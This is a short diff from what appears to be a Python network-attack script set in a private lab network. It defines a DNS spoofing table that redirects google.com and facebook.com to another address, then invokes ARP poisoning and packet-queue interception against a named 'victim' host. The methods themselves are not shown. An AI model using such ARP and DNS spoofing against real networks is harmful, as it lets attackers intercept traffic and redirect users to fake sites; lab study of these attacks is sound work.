@@ -128,11 +128,11 @@ class DefaultTool:
 
 victim_ip = "192.168.56.103"
 server_ip = "192.168.56.102"
-dict_site = {
+dict_sites = {
             b"www.google.com.": "199.15.163.145",
             b"google.com.": "199.15.163.145",
             b"facebook.com.": "199.15.163.145"
            }
-tool = DefaultTool(victim_ip, server_ip)
+tool = DefaultTool(victim_ip, server_ip, dict_sites)
 tool.arp_poisoning()
 tool.nfqueue()
